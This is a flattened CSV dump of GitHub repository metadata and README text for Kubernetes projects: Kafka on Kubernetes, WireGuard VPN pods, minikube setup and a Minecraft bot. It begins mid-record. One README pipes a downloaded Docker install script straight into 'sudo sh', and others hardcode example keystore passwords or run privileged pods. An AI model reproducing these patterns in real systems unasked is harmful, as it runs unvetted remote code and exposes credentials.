1d replication 1 default exit Adhoc K6 load test with custom Docker image bash build and push the K6 load test image docker build t k6 nginx test docker tag k6 nginx test lreimer k6 nginx test docker push lreimer k6 nginx test run the image as a pod be sure to pass the restart flag otherwise the containers gets restarted kubectl run k6 nginx test image lreimer k6 nginx test restart Never attach kubectl delete pod k6 nginx test Maintainer M Leander Reimer lreimer License This software is provided under the MIT open source license read the LICENSE file for details,2020-11-05T20:06:27Z,2020-12-11T12:57:48Z,TypeScript,User,1,2,0,2,main,lreimer,1,0,0,0,0,0,0
gakkiyomi,keycloak-k8s-deploy-template,,keycloak k8s deploy template keycloak k8s docker k8s postgresql svc yamlip deploy sh,2020-12-12T06:25:13Z,2020-12-12T07:09:54Z,Shell,User,1,2,0,3,main,gakkiyomi,1,0,0,0,0,0,0
louis030195,mineflayer-k8s,docker#kubernetes#mineflayer#prismarinejs#tensorflowjs,mineflayer k8s Docker https github com louis030195 mineflayer k8s workflows Docker badge svg Docker Pulls https img shields io docker pulls louis030195 mineflayer k8s Docker Image Size tag https img shields io docker image size louis030195 mineflayer k8s latest Discord https img shields io badge chat on 20discord brightgreen svg https discord gg GsEFRM8 Try it on gitpod https img shields io badge try on 20gitpod brightgreen svg https gitpod io https github com louis030195 mineflayer k8s A Mineflayer example bot runnable as a baremetal process https nodejs org en as a Docker container https www docker com or as a Kubernetes Deployment https kubernetes io docs concepts workloads controllers deployment deploy a mineflayer k8s docs images deploy gif multi mineflayer k8s docs images multi gif If you re lucky mineflayer k8s s are running on 109 210 246 114 30018 Minecraft server running in a Kubernetes cluster running on a Raspberry PI Viewer You can interactively see what your bot is doing using prismarine viewer https github com PrismarineJS prismarine viewer in the web You can disable this feature easily by adding viewer to the disabled plugins or any plugins in the plugins directory in the configuration json disabledPlugins viewer viewer docs images viewer gif Node dependencies mineflayer https github com PrismarineJS mineflayer mineflayer cmd https github com PrismarineJS mineflayer cmd mineflayer pathfinder https github com PrismarineJS mineflayer pathfinder mineflayer pvp https github com PrismarineJS mineflayer pvp prismarine viewer https github com PrismarineJS prismarine viewer Minecraft bots tensorflow tfjs node https github com tensorflow tfjs tensorflow tfjs tensorflow models toxicity https github com tensorflow tfjs models deep learning winston https github com winstonjs winston logging yargs https github com yargs yargs arguments Usage If you want to use Kubernetes and know it plus Helm just jump directly to the values helm values yaml make louis louis pc Documents mineflayer k8s make help usage make target Variables TAG Docker tag default TAG 0 1 4 CONFIG path to application config file default CONFIG setting json SERVERCONFIG path to minecraft server config file default SERVERCONFIG server values yaml Targets help Display this help buildpush Build and push on DockerHub multiarch Docker image need Docker buildx deploy Deploy as a baremetal process deploydocker Deploy as a Docker container deployk8s Deploy as a Kubernetes Deployment deployk8sserver Deploy a github comitzg minecraft server charts on Kubernetes Run as nodejs process Dependencies make https www gnu org software make manual make html nodejs https nodejs org en Default settings Using default settings default json bash make deploy With custom settings bash CONFIG setting json make deploy Run as Docker container Dependencies make https www gnu org software make manual make html docker https www docker com Supported OS ARCH see tags https hub docker com r louis030195 mineflayer k8s tags I personally run this on my Raspberry PI 4B Default settings Using default settings default json bash make deploydocker With custom settings bash CONFIG setting json make deploydocker Run as Kubernetes Deployment Dependencies make https www gnu org software make manual make html A k8s https kubernetes io cluster running and configured jq https stedolan github io jq helm https helm sh Default settings Using default settings default json bash make deployk8s With custom settings bash RELEASE mt1 CONFIG setting json make deployk8s Example Helm output bash helm install mk helm f helm values dev yaml dry run debug NOTES mk connecting as foo to 109 210 246 114 30018 server running version 1 16 4 1 Get logs kubectl logs f l app kubernetes io instance mk 2 Watch your bot playing in the web using prismarine viewer at 109 210 246 114 30019 Deploy a externally accessible Minecraft server on your k8s cluster 1 Port forward port between 30000 and 31000 k8s allowed TCP Kubernetes API 6443 TCP 2 Assign a static IP 3 Use similar config for make deployk8sserver yaml minecraftServer eula true version 1 16 4 serviceType LoadBalancer loadBalancerIP externalIPs nodePort Troubleshoot Could not resolve host launchermeta mojang com see issue https github com itzg docker minecraft server issues 317 issuecomment 507498422 bash kubectl edit deployment minecraft server minecraft dnsPolicy None dnsConfig nameservers 8 8 8 8,2020-11-25T18:33:40Z,2020-12-25T15:04:24Z,JavaScript,User,2,2,0,6,main,louis030195,1,0,0,0,0,0,0
tocinoatbp013,k8s-interface,,k8s interface Tasks Immediate tasks x Create HTML with one button to restart a pod x Learn to trigger AJAX requests to a server using javascript you can use Jquery library x Write a simple Go web server https golang org doc articles wiki x Import the kubernetes client go Get your hands wet with writing building and running Go code,2020-11-29T02:18:48Z,2020-12-03T09:09:29Z,Go,User,2,2,0,1,main,tocinoatbp013,1,0,0,0,0,0,0
solo-io,k8s-utils,,,2020-11-13T22:23:34Z,2020-12-14T15:13:03Z,Go,Organization,4,2,0,12,master,yuval-k#EItanya#kdorosh#Sodman,4,3,3,1,0,1,4
kildibaev,k8s-kafka,,Kubernetes Apache Kafka Kafka Connect MirrorMaker 2 0 Jmeter Apache Kafka Kubernetes Apache Kafka stateful VirtualBox Docker Kubernetes Kubernetes Apache Kafka production backup production backup MirrorMaker 2 0 production TLS Git certs certs tar gz Jmeter github com kildibaev k8s kafka https github com kildibaev k8s kafka c Kubernetes 12 Apache Kafka deploy cluster Q A Ubuntu Kubernetes CentOS 7 CentOS Jmeter Ubuntu k3s MicroK8s k3s MicroK8s Docker Flannel kubernetes Flannel Docker CRI O CRI O MirrorMaker 2 0 Kafka Connect Kafka Connect MirrorMaker 2 0 REST API 1 create vm 2 Ubuntu Server 20 04 install ubuntu 3 Ubuntu setup ubuntu 4 Docker install docker 5 iptables setup iptables 6 kubeadm kubelet kubectl install kubeadm kubelet kubectl 7 Kubernetes kubeadm init 8 Flannel deploing flannel 9 pod control plane control plane node isolation 10 kubectl kubectl alias 11 Prometheus Grafana Alert Manager Node Exporter deploing monitoring 12 Apache Kafka deploy cluster 12 1 Apache Zookeeper deploy zookeeper 12 2 Apache Kafka deploy kafka 13 check 13 1 run producer 13 2 run consumer 14 MirrorMaker 2 0 mirrormaker 14 1 MirrorMaker 2 0 Kafka Connect deploy mirrormaker 14 2 check replication 15 Jmeter run jmeter 16 delete 1 2 6 8 Rancher K3S https k3s io img 14 png img 15 png img 16 png img 17 png img 18 png img 19 png 2 Ubuntu Server 20 04 IP 10 0 2 15 Kubernetes swap Install OpenSSH server img 1 PNG img 2 PNG img 3 PNG img 4 PNG img 5 PNG img 6 PNG img 7 PNG img 8 PNG img 9 PNG img 10 PNG img 11 PNG img 12 PNG img 13 PNG 3 Ubuntu 3 1 Firewall bash sudo ufw disable 3 2 Swap bash sudo swapoff a sudo sed i s swap swap etc fstab 3 3 OpenJDK OpenJDK keytool bash sudo apt install openjdk 8 jdk headless 3 4 DigitalOcean https www digitalocean com community tutorials how to set up ssh keys on ubuntu 20 04 ru 4 Docker bash Switch to the root user sudo su Install Docker CE Set up the repository Install packages to allow apt to use a repository over HTTPS apt get update apt get install y apt transport https ca certificates curl software properties common gnupg2 Add Dockers official GPG key curl fsSL https download docker com linux ubuntu gpg apt key add Add the Docker apt repository add apt repository deb arch amd64 https download docker com linux ubuntu lsbrelease cs stable Install Docker CE apt get update apt get install y containerd io 1 2 13 2 docker ce 5 19 03 11 3 0 ubuntu lsbrelease cs docker ce cli 5 19 03 11 3 0 ubuntu lsbrelease cs Set up the Docker daemon cat etc docker daemon json EOF exec opts native cgroupdriver systemd log driver json file log opts max size 100m storage driver overlay2 EOF mkdir p etc systemd system docker service d Restart Docker systemctl daemon reload systemctl restart docker If you want the docker service to start on boot run the following command sudo systemctl enable docker 5 iptables bash cat EOF sudo tee etc sysctl d k8s conf net bridge bridge nf call ip6tables 1 net bridge bridge nf call iptables 1 EOF sudo sysctl system 6 kubeadm kubelet kubectl bash sudo apt get update sudo apt get install y apt transport https curl curl s https packages cloud google com apt doc apt key gpg sudo apt key add cat EOF sudo tee etc apt sources list d kubernetes list deb https apt kubernetes io kubernetes xenial main EOF sudo apt get update sudo apt get install y kubelet kubeadm kubectl sudo apt mark hold kubelet kubeadm kubectl 7 Kubernetes control plane bash Pulling images required for setting up a Kubernetes cluster This might take a minute or two depending on the speed of your internet connection sudo kubeadm config images pull Initialize a Kubernetes control plane node sudo kubeadm init pod network cidr 10 244 0 0 16 root bash mkdir p HOME kube sudo cp i etc kubernetes admin conf HOME kube config sudo chown id u id g HOME kube config 8 Flannel bash kubectl apply f https raw githubusercontent com coreos flannel master Documentation kube flannel yml 9 pod control plane Kubernetes standalone pod control plane bash kubectl taint nodes all node role kubernetes io master 10 kubectl bash alias k kubectl echo alias k kubectl bashrc 11 Prometheus Grafana Alert Manager Node Exporter kube prometheus bash curl O L https github com coreos kube prometheus archive master zip sudo apt install y unzip unzip master zip cd kube prometheus master kubectl create f manifests setup kubectl create f manifests pod pod Running bash kubectl get pods w n monitoring Kafka Zookeeper JMX Exporter Prometheus ServiceMonitor bash k apply f https raw githubusercontent com kildibaev k8s kafka master servicemonitor jmx exporter servicemonitor yaml Grafana bash kubectl apply f https raw githubusercontent com kildibaev k8s kafka master service grafana svc yaml Grafana http localhost 32000 Grafana img 25 png Grafana http 127 0 0 1 3000 Grafana http 127 0 0 1 3000 dashboard import Import via panel json grafana dashboard json https raw githubusercontent com kildibaev k8s kafka master config grafana dashboard json 12 Apache Kafka bash git clone https github com kildibaev k8s kafka git HOME k8s kafka cd HOME k8s kafka 12 1 Apache Zookeeper Statefulset Apache Zookeeper zookeeper 0 zookeeper zookeeper 1 zookeeper zookeeper 2 zookeeper bash zookeeper base sudo docker build t zookeeper base local v1 f dockerfile zookeeper base dockerfile Zookeeper k apply f service zookeeper svc yaml Apache Zookeeper k apply f statefulset zookeeper statefulset yaml pod Running pod k get pods w 12 2 Apache Kafka Apache Kafka kafka 0 kafka kafka 1 kafka bash kafka base sudo docker build t kafka base local v1 f dockerfile kafka base dockerfile Kafka k apply f service kafka svc yaml Apache Kafka k apply f statefulset kafka statefulset yaml pod Running pod k get pods w 13 13 1 10 100 30000 bash pod producer k run rm i tty producer image kafka base local v1 bash topicname bin kafka producer perf test sh topic topicname num records 30000 record size 100 throughput 10 producer config config client properties producer props acks 1 bootstrap servers kafka 0 kafka 9092 kafka 1 kafka 9092 buffer memory 33554432 batch size 8196 13 2 bash pod consumer k run rm i tty consumer image kafka base local v1 bash topicname bin kafka consumer perf test sh broker list kafka 0 kafka 9092 kafka 1 kafka 9092 consumer config config client properties messages 30000 topic topicname threads 2 14 MirrorMaker 2 0 14 1 MirrorMaker 2 0 Kafka Connect Apache Kafka production pod Apache Zookeeper Apache Kafka Kafka Connect Apache Kafka backup production backup bash k apply f service mirrormaker svc yaml pod Apache Zookeeper Apache Kafka Kafka Connect k apply f statefulset mirrormaker statefulset yaml pod mirrormaker 0 Running k get pods w connect pod mirrormaker 0 k exec ti mirrormaker 0 c connect bash Kafka Connect MirrorMaker 2 0 curl X POST H Content Type application json mirrormaker 0 mirrormaker 8083 connectors d name MirrorSourceConnector config connector class org apache kafka connect mirror MirrorSourceConnector source cluster alias production target cluster alias backup source cluster bootstrap servers kafka 0 kafka 9092 kafka 1 kafka 9092 source cluster group id mirrormakerconsumer source cluster enable auto commit true source cluster auto commit interval ms 1000 source cluster session timeout ms 30000 source cluster security protocol SSL source cluster ssl truststore location certs kafkaCA trusted jks source cluster ssl truststore password kafkapilot source cluster ssl truststore type JKS source cluster ssl keystore location certs kafka consumer jks source cluster ssl keystore password kafkapilot source cluster ssl keystore type JKS target cluster bootstrap servers localhost 9092 target cluster compression type none topics rotate interval ms 1000 key converter class org apache kafka connect converters ByteArrayConverter value converter class org apache kafka connect converters ByteArrayConverter 14 2 backup production topicname production MirrorMaker 2 0 active active bash pod consumer k exec ti mirrormaker 0 c kafka bash bin kafka topics sh list bootstrap server mirrormaker 0 mirrormaker 9092 production topicname bin kafka console consumer sh bootstrap server mirrormaker 0 mirrormaker 9092 topic production topicname from beginning production topicname Kafka Connect bash k logs mirrormaker 0 connect ERROR WorkerSourceTaskid MirrorSourceConnector 0 Failed to flush timed out while waiting for producer to flush outstanding 1 messages org apache kafka connect runtime WorkerSourceTask 438 ERROR WorkerSourceTaskid MirrorSourceConnector 0 Failed to commit offsets org apache kafka connect runtime SourceTaskOffsetCommitter 114 producer buffer memory bash k exec ti mirrormaker 0 c connect bash curl X PUT H Content Type application json mirrormaker 0 mirrormaker 8083 connectors MirrorSourceConnector config d connector class org apache kafka connect mirror MirrorSourceConnector source cluster alias production target cluster alias backup source cluster bootstrap servers kafka 0 kafka 9092 kafka 1 kafka 9092 source cluster group id mirrormakerconsumer source cluster enable auto commit true source cluster auto commit interval ms 1000 source cluster session timeout ms 30000 source cluster security protocol SSL source cluster ssl truststore location certs kafkaCA trusted jks source cluster ssl truststore password kafkapilot source cluster ssl truststore type JKS source cluster ssl keystore location certs kafka consumer jks source cluster ssl keystore password kafkapilot source cluster ssl keystore type JKS target cluster bootstrap servers localhost 9092 target cluster compression type none topics rotate interval ms 1000 producer buffer memory 1000 key converter class org apache kafka connect converters ByteArrayConverter value converter class org apache kafka connect converters ByteArrayConverter 15 Jmeter bash jmeter base sudo docker build t jmeter base local v1 f dockerfile jmeter base dockerfile Jmeter k apply f service jmeter svc yaml pod Jmeter k apply f statefulset jmeter statefulset yaml pod jmeter producer producer jmx bash k run rm i tty jmeter producer image jmeter base local v1 bash jmeter n t tests producer jmx r Jremotehosts jmeter 0 jmeter 1099 jmeter 1 jmeter 1099 pod jmeter consumer consumer jmx bash k run rm i tty jmeter consumer image jmeter base local v1 bash jmeter n t tests consumer jmx r Jremotehosts jmeter 2 jmeter 1099 jmeter 3 jmeter 1099 16 statefulset bash k delete statefulset jmeter zookeeper kafka mirrormaker bash sudo docker rmi f zookeeper base local v1 kafka base local v1 jmeter base local v1 bash k delete svc grafana jmeter kafka mirrormaker zookeeper k delete servicemonitor jmxexporter linkedin kildibaev https www linkedin com in kildibaev,2020-08-17T14:54:37Z,2020-09-09T08:36:40Z,Dockerfile,User,1,2,0,4,master,kildibaev,1,0,0,0,0,0,0
locnh,k8s-puller,,k8s Images Puller The puller periodically pulls image s to k8s cluster nodes to save the time of pulling images when launching new pods These are the Docker Hub autobuild images located here https hub docker com r locnh k8s puller License https img shields io github license locnh k8s puller LICENSE Build Status https travis ci org locnh k8s puller svg branch master https travis ci org locnh k8s puller Docker Image Size latest semver https img shields io docker image size locnh k8s puller sort semver Dockerfile Docker Image Version latest semver https img shields io docker v locnh k8s puller sort semver Dockerfile Docker https img shields io docker pulls locnh k8s puller https hub docker com r locnh k8s puller codecov https codecov io gh locnh k8s puller branch master graph badge svg token 22M1LNHEEM https codecov io gh locnh k8s puller Usage Helm Helm chart has been moved to HowDevOps helm charts https github com HowDevOps helm charts tree main charts k8s puller repository Docker Parameters as ENV variables Variable Description Mandatory Default IMAGES List of images to be pulled separated by Yes null INTERVAL Time interval eg 30s 5m 1h more http golang org pkg time ParseDuration No 60m JSONLOG Toggle for JSON log format No false DOCKERUSERNAME username to login to docker registry No DOCKERPASSWORD password to login to docker registry No DOCKERSERVER server https docs docker com engine reference commandline login login to a self hosted registry to login to docker registry No Run a Docker container sh docker run name puller e IMAGES busybox alpine e INTERVAL 60m v var run docker sock var run docker sock d locnh k8s puller Contribute 1 Fork me 2 Make changes 3 Create pull request 4 Grab a cup of tee and enjoy,2020-10-13T09:43:45Z,2020-11-06T08:20:33Z,Go,User,1,2,0,5,master,locnh,1,0,5,0,0,0,4
ivanmorenoj,k8s-wireguard,,How to connect to kubernetes internal network using WireGuard cover img cover png When you are testing your deployments in a kubernetes cluster on the cloud you have a few options to expose your services outside world for example you can use a NodePort service but also you need to configure the firewall rules for each NodePort service the other type of service that you can use is LoadBalancer however each of them is billed by cloud provider To solve this problem you can use a vpn running within your k8s cluster this vpn can be exposed outside the cluster with a NodePort or LoadBalancer service As client you can access to you kubernetes internal network using service FQDN in your local machine In this tutorial we gonna setup a pod that run wireguard server this wireguard will be configured with the kube dns service and generate cliente credentials automatically the diagram will be like this diagram img diagram png Assuming that you are in a testing k8s cluster in the cloud with multiple namespaces and services First we need to know the kube dns IP address with the following command sh kubectl n kube system get svc grep kube dns awk print 3 output example 10 124 0 10 In order to isolate wireguard server from another apps we need to create a wireguard namespace named wireguard yaml apiVersion v1 kind Namespace metadata name wireguard labels name wireguard To store wireguard config files we need a persistent volume in my case im using a gke managed service that provides me a storage class so im gonna create a persistent volume claim to that storage class yaml apiVersion v1 kind PersistentVolumeClaim metadata name pv claim wireguard namespace wireguard spec storageClassName standard accessModes ReadWriteOnce resources requests storage 10M The next thing to configure is the environment variables of wireguard server this will be do with a config map The kube dns IP from steps earlier will be set in PEERDNS field yaml apiVersion v1 kind ConfigMap metadata name wireguard configmap namespace wireguard data PUID 1000 PGID 1000 TZ America MexicoCity SERVERPORT 31820 PEERS 2 PEERDNS 10 124 0 10 ALLOWEDIPS 0 0 0 0 0 0 INTERNALSUBNET 10 13 13 0 Now we can create the wireguard server pod this pod needs to be privileged with NETADMIN and SYSMODULE capabilities and needs to mount lib modules directory from the host The image used is ghcr io linuxserver wireguard from linuxserver io https hub docker com r linuxserver wireguard yaml apiVersion v1 kind Pod metadata name wireguard namespace wireguard labels app wireguard spec containers name wireguard image ghcr io linuxserver wireguard envFrom configMapRef name wireguard configmap securityContext capabilities add NETADMIN SYSMODULE privileged true volumeMounts name wg config mountPath config name host volumes mountPath lib modules ports containerPort 51820 protocol UDP resources requests memory 64Mi cpu 100m limits memory 128Mi cpu 200m volumes name wg config persistentVolumeClaim claimName pv claim wireguard name host volumes hostPath path lib modules type Directory Finally to access to wireguard server we need to create a service this service could be a NodePort or LoadBalancer in my case i used a NodePort service on port 31820 take in mind that you probably need to configure a firewall rule to access at this service yaml kind Service apiVersion v1 metadata labels k8s app wireguard name wireguard service namespace wireguard spec type NodePort ports port 51820 nodePort 31820 protocol UDP targetPort 51820 selector app wireguard This configurations are in a single file wireguard pod yaml to execute just apply the file with kubectl command sh kubectl apply f wireguard pod yaml The container generate a QR code for each peer these QR appears in the logs of the pod to see just type the following command sh kubectl n wireguard logs wireguard The output will be like this qr code img wg output qr png In order to connect to wireguard server download mobile app of install in your local machine See wireguard com https www wireguard com install You can scan the code with the mobile app or copy the config file in your computer at peer1 conf sh kubectl n wireguard exec wireguard cat config peer1 peer1 conf peer1 conf Now you can utilize the config file to activate the vpn With NetworManager you can import the config file sh nmcli connection import type wireguard file peer1 conf And activate or deactivate the connection sh nmcli connection up peer1 nmcli connection down peer1 Finally to access a ClusterIP service within k8s cluster just use the IP of ClusterIP service or use the FQDN of the service using the following rule svc cluster local Check the output of dig in a FQDN inside a remote k8s cluster note that the query is answered by kube dns IP inside the k8s cluster dig output img dig output png For example to access a ClusterIP service named thingsboard service in the namespace thingsboard at 9090 port from our local machine through wireguard vpn http thingsboard service thingsboard svc cluster local 9090 And the output in our local environment web app test img web app test png Conclusion This method is very useful for a managed kubernetes service in the cloud in a development environment because we can test our services without configure a nodePort for each service and his respectively firewall rule WARNING Only use this method in a development environment dont use in a production environment Source Code https github com ivanmorenoj k8s wireguard,2020-11-13T07:02:43Z,2020-12-20T18:47:14Z,n/a,User,1,2,0,2,main,ivanmorenoj,1,0,0,0,0,0,0
edoparo,k8s-workshop,,K8S Workshop This workshop is intended to explore Kubernetes assuming to have a working Kubernetes instance We re gonna use the GKE Google Kubernetes Engine on the GCP Google Cloud Platform Table of contents kubectl topics kubectl md Deploy a pod topics pod deployment pod deployment md Volumes topics volumes volumes md ConfigMap Secret topics config secrets config secrets md Service Ingress topics service ingress service ingress md Job CronJob DeamonSet topics jobs cronjob deamonset md Helm Tiller Monitoring with prometheus Istio,2020-08-20T10:47:43Z,2020-09-25T07:34:13Z,HTML,User,1,2,1,12,master,die900#edoparo#edoardopasiwelld,3,0,0,0,0,0,0
kulvind3r,k8s-playbook,,k8s playbook Minimal ansible playbook for setting up kubeadm based multi node k8s cluster using VirtualBox VMs as nodes Meant For Strictly local use for doing POCs or Learning how to setup a multi node k8s cluster from scratch Not meant for prod use Good for doing spikes testing upgrades of k8s from one version to another Features VagrantFile to setup desired number of networked VirtualBox VMs Easily configurable resource allocation for master and worker nodes Extensible to add multiple worker nodes if you have the hardware capacity default 1 It takes just two commands Pre requisites Vagrant VirtualBox and Ansible Installed on Host Internet connectivity for installation and downloading vagrant basebox 1 3 GB Not an offline k8s setup How to use Ensure Pre requisites are met Then from root of repo 1 vagrant up Once vagrant has finished setting up the vms Add your host ssh public key as authorised keys in all VM nodes required for ansible to ssh 2 ansible playbook i inventory ini site yml Once Ansible play is finished You will find kubectl on master node to manage the cluster Planned Features Moving etcd out to a separate node Setup multi master cluster,2020-09-03T11:39:09Z,2020-10-29T11:15:57Z,n/a,User,1,2,0,5,master,kulvind3r,1,0,0,0,0,0,0
stibi,k8s-skoleni,,,2020-12-06T21:07:51Z,2020-12-17T13:52:14Z,HCL,User,1,2,0,21,master,stibi,1,0,0,0,0,0,0
Sunoyon,k8s-playground,,,2020-12-02T12:40:48Z,2020-12-02T15:41:09Z,n/a,User,1,2,0,4,master,Sunoyon,1,0,0,0,0,0,0
theopenconversationkit,tock-k8s,,tock k8s Kubernetes implementation and resources for Tock Deploying Tock Studio on localhost with kind kind https kind sigs k8s io is a tool for running local Kubernetes clusters using Docker container nodes sh curl Lo kind https github com kubernetes sigs kind releases download v0 8 1 kind linux amd64 chmod x kind create kind cluster sh start with kind sh Notice All data are stored in tock mongo data folder All services are deployed with tock namespace Logs kubectl logs f l type mongo kubectl logs f l type tock studio kubectl logs f l type bot api Stopping TOCK STUDIO stop with kind sh Destroy your kind cluster kind delete cluster,2020-09-07T11:02:40Z,2020-09-23T09:47:15Z,Shell,Organization,6,2,0,9,master,elebescond#francoisno,2,0,0,0,0,0,0
dealroadshow,k8s-framework,,Dealroadshow K8S Framework This framework uses low level library dealroadshow k8s resources https github com dealroadshow k8s resources and adds some high level abstractions to facilitate definitions of your Kubernetes manifests The recommended way to use this framework is by installing dealroadshow k8s bundle https github com dealroadshow k8s bundle which integrates this framework with Symfony 5 By using dealroadshow k8s bundle https github com dealroadshow k8s bundle you get the full power of Symfony framework https github com symfony symfony zero configuration Dependency Injection which will make your experience in writing Kubernetes manifests better than ever However framework can be used as a standalone library Installation The real work of generating Kubernetes Yaml manifests is done by the dealroadshow k8s resources https github com dealroadshow k8s resources library Therefore you need to install the proper version of this library before using the framework Check your Kubernetes version and install corresponding version of dealroadshow k8s resources https github com dealroadshow k8s resources For example if you re using Kubernetes v1 16 install dealroadshow k8s resources https github com dealroadshow k8s resources as follows bash composer require dealroadshow k8s resources 1 16 As you see dealroadshow k8s resources https github com dealroadshow k8s resources versioning mirrors versioning of Kubernetes itself After that you may install the latest version of K8S Framework bash composer require dealroadshow k8s framework If you want to see usage examples please refer to dealroadshow k8s bundle https github com dealroadshow k8s bundle,2020-10-06T19:52:26Z,2020-12-13T18:03:57Z,PHP,Organization,3,2,1,49,master,petr-buchyn#bpasfinsight#petr-buchin,3,20,20,0,0,0,13
happyshui,k8s-practice,,k8s practice kubernters https github com happyshui k8s practice blob main images kubernetes png,2020-11-09T11:23:12Z,2020-12-15T03:51:56Z,n/a,User,1,2,0,8,main,happyshui,1,0,0,0,0,0,0
golodnyj,practicum-k8s,,Managed Service for Kubernetes MDB 1 yc https cloud yandex ru docs cli quickstart Terraform https learn hashicorp com tutorials terraform install cli Docker https docs docker com get docker Kubectl https kubernetes io docs tasks tools install kubectl envsubst git ssh curl 2 https cloud yandex ru 3 0 https youtu be M0fXvr8h8bE 1 VM yc https youtu be jKRNy0SJ5E SSH yc SSH 1 SSH https cloud yandex ru docs compute operations vm connect ssh creating ssh keys ssh keygen t rsa b 2048 ssh cat ssh idrsa pub 2 base image lab vm base image SSD sa admin SSH ssh idrsa pub 3 Running 4 sa admin IPv4 5 SSH 6 yc 1 id echo export FOLDERID folder id here bashrc bashrc echo FOLDERID 3 yc config set folder id FOLDERID 2 yc config set instance service account true yc 4 yc yc compute instance list PostgreSQL Terraform 2 Terraform https youtu be ZDYVsVMuZeQ Terraform Terraform PostgreSQL Terraform 1 REPO echo export REPO home common yandex scale 2020 lab k8s bashrc bashrc echo REPO cd REPO git pull Terraform PostgreSQL 1 Terraform cd REPO terraform ls terraform init 2 Terraform terraform apply var ycfolder FOLDERID var user USER 3 Terraform Managed K8S 3 https youtu be PfjaBv7X4o8 1 Managed Service for Kubernetes lab k8s 2 k8s cluster manager k8s image puller Container Registry 3 Kubernetes 1 lab k8s group SSH ssh idrsa pub 2 Terraform PostgreSQL 4 https youtu be NWNnuzBxFD8 PostgreSQL PostgreSQL 1 Terraform Outputs 2 echo export DATABASEURI databaseuri here bashrc echo export DATABASEHOSTS databasehosts here bashrc bashrc echo DATABASEURI echo DATABASEHOSTS 3 Terraform yc managed postgresql cluster list yc managed postgresql cluster get K8S 5 https youtu be zmvuhNOhzw 1 2 yc managed kubernetes cluster list echo export K8SID k8s id here bashrc bashrc echo K8SID yc managed kubernetes cluster id K8SID get yc managed kubernetes cluster id K8SID list node groups Kubectl yc managed kubernetes cluster get credentials id K8SID external kube config cat kube config Docker 6 Docker https youtu be dArqkeLksQk Container Registry Docker Container Registry 1 yc container registry create name lab registry 2 id echo export REGISTRYID registry id here bashrc bashrc 2 yc container registry list yc container registry get REGISTRYID 3 docker yc container registry configure docker cat docker config json config json credHelpers container registry cloud yandex net yc cr cloud yandex net yc cr yandex yc Docker Container Registry 1 cd REPO app ls 2 sudo docker build tag cr yandex REGISTRYID lab demo v1 sudo docker images 3 sudo docker push cr yandex REGISTRYID lab demo v1 Docker 1 Docker yc container image list ID k8s 7 kubectl https youtu be q5NR5wJwPpQ 1 cd REPO k8s files ls cat lab demo yaml tpl cat load balancer yaml 2 lab demo yaml tpl DATABASEURI DATABASEHOSTS terraform REGISTRYID yc container registry list envsubst REGISTRYID DATABASEURI DATABASEHOSTS lab demo yaml cat lab demo yaml 3 lab demo yaml tpl lab demo yaml 4 kubectl apply f lab demo yaml kubectl describe deployment lab demo kubectl apply f load balancer yaml kubectl describe service lab demo 5 URL LoadBalancer Ingress 8 https youtu be c9yXNJPfeuo MDB PostgreSQL Managed Kubernetes 1 k8s MDB PostgreSQL MDB 1 Managed Service for PostgreSQL UI 2 3 Managed Kubernetes 1 Managed Service for Kubernetes 2 3 4 k8s 9 https youtu be CaDWyC0Mpvo k8s k8s Terraform Docker k8s kubectl delete f load balancer yaml kubectl delete f lab demo yaml k8s yc managed kubernetes cluster list yc managed kubernetes cluster delete lab k8s yc managed kubernetes cluster list Terraform cd REPO terraform terraform destroy var ycfolder FOLDERID var user USER yc managed postgresql cluster list Docker Container Registry lab registry lab registry Compute lab vm,2020-12-14T13:15:17Z,2020-12-15T14:54:13Z,Python,User,1,2,1,1,master,golodnyj,1,0,0,0,0,0,0
bartvanbenthem,k8s-onerepo,,Description Generate manifests for multiple Kubernetes clusters and teams from a single repository project structure shell config cluster helmcharts utils filesystem manifestgen var helmcharts templates values prerequisites Install kubectl https kubernetes io docs tasks tools install kubectl Install Helm https helm sh docs intro install Run Example Download k8s onerepo binary and example var folder shell git clone https github com bartvanbenthem k8s onerepo git set environment variables and run example manifest generation shell export K8SONEREPOVALUES var values export K8SONEREPOTEMPLATES var templates export K8SONEREPOCONFIG config export K8SONEREPOHELMTEMPLATES var helmcharts export K8SONEREPOHELMCONFIG config helmcharts cd k8s onerepo bin k8s onerepo Deploy the generated example configuration to Kubernetes https github com bartvanbenthem k8s onerepo blob master config README md The Example stack contains the following K8s native service configurations Nginx ingress Prometheus Operator Grafana Loki and Promtail,2020-09-24T17:13:07Z,2020-12-15T15:55:11Z,Python,User,2,2,0,71,master,bartvanbenthem,1,0,0,0,0,0,0
samsungdx,SDI-K8s,,,2020-09-25T11:06:22Z,2020-12-06T08:33:49Z,HTML,Organization,7,2,3,45,main,whatwant#sky9723,2,0,0,2,5,0,0
wnqueiroz,fiap-k8s,,FIAP Kubernetes Esse repositrio contm os scripts para provisionar o Redis em cluster mode e a aplica o nestjs redis https github com wnqueiroz nestjs redis no Kubernetes utilizando o minikube https minikube sigs k8s io docs Sumrio Pr requisitos pr requisitos Hands On hands on Pr requisitos Antes de executar os scripts necessrio instalar as ferramentas que s o utilizadas nessa demo Ferramentas Docker kubectl minikube As instalaes a seguir devem ser realizadas em uma distribui o linux de preferncia ubuntu P Instalando o Docker Execute o comando que instalar o Docker bash curl fsSL https get docker com sudo sh Por fim adicione o seu usurio para conseguir executar os comandos docker bash sudo usermod aG docker USER Encerre a sess o atual e entre novamente para n o ter problemas ao executar os comandos Valide a instala o com bash docker version Veja mais em https docs docker com engine install ubuntu install using the convenience script Instalando o kubectl Execute os comandos que instalar o o kubectl bash curl LO https storage googleapis com kubernetes release release curl s https storage googleapis com kubernetes release release stable txt bin linux amd64 kubectl chmod x kubectl sudo mv kubectl usr local bin kubectl Valide a instala o com bash kubectl version client Veja mais em https kubernetes io docs tasks tools install kubectl Instalando o minikube Execute os comandos que instalar o o minikube bash curl LO https storage googleapis com minikube releases latest minikube linux amd64 sudo install minikube linux amd64 usr local bin minikube Inicie o cluster com bash minikube start Veja mais em https minikube sigs k8s io docs start Hands On Os comandos para gerenciar e provisionar os pods e servios no nosso cluster est o nos arquivos abaixo na raiz do repositrio 00 install redis sh 00 install redis sh 01 install nestjs redis sh 01 install nestjs redis sh,2020-12-07T16:25:20Z,2020-12-09T01:59:39Z,Shell,User,1,2,0,7,main,wnqueiroz,1,0,0,0,0,0,0
